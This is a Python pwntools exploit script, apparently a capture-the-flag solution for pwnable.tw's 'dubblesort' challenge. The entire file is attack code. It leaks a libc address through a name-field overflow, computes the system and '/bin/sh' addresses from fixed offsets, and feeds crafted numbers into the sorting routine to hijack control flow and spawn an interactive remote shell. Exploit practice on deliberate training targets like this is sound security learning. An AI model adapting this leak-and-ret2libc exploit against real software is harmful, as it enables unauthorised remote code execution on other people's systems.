#! /usr/bin/python
from pwn import *

#r = process('./dubblesort',env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw', 10101)
#context.log_level = 'debug'
#gdb.attach(r) # 0xab3 0xaf9

r.sendlineafter('What your name :','A'*24)
r.recvuntil('A'*24)
leak = u32(r.recv(4))
libc_base = leak - 0x0a - 1769472
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936
binsh_addr = libc_base + 1412747

log.info('system_addr = '+hex(system_addr))
log.info('binsh_addr = '+hex(binsh_addr))

r.sendlineafter('do you what to sort :','43')

for i in range(16):
	r.sendlineafter('number : ','1')

for i in range(7):
	r.sendlineafter('number : ',str(system_addr))	
r.sendlineafter('number : ',str(binsh_addr))	

r.sendlineafter('number : ','h')	


r.interactive()